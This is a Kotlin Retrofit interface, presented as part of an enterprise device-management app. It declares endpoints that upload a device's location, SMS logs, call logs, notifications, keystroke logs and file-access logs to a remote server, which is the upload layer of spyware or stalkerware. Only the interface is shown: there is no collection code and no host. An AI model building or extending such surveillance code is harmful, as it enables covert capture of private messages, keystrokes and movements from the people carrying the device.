package com.enterprise.devicemanagement.api

import com.enterprise.devicemanagement.data.DeviceInfo
import retrofit2.http.Body
import retrofit2.http.POST

interface ApiService {
    
    @POST("devices/register")
    suspend fun registerDevice(@Body deviceInfo: DeviceInfo)
    
    @POST("devices/heartbeat")
    suspend fun sendHeartbeat(@Body deviceInfo: DeviceInfo)
    
    @POST("logs/location")
    suspend fun sendLocation(@Body locationData: Map<String, Any>)
    
    @POST("logs/sms")
    suspend fun sendSmsLog(@Body smsData: Map<String, Any>)
    
    @POST("logs/call")
    suspend fun sendCallLog(@Body callData: Map<String, Any>)
    
    @POST("logs/notification")
    suspend fun sendNotification(@Body notificationData: Map<String, Any>)
    
    @POST("logs/keylog")
    suspend fun sendKeyLog(@Body keyLogData: Map<String, Any>)
    
    @POST("logs/file-access")
    suspend fun sendFileAccessLog(@Body fileAccessData: Map<String, Any>)
}
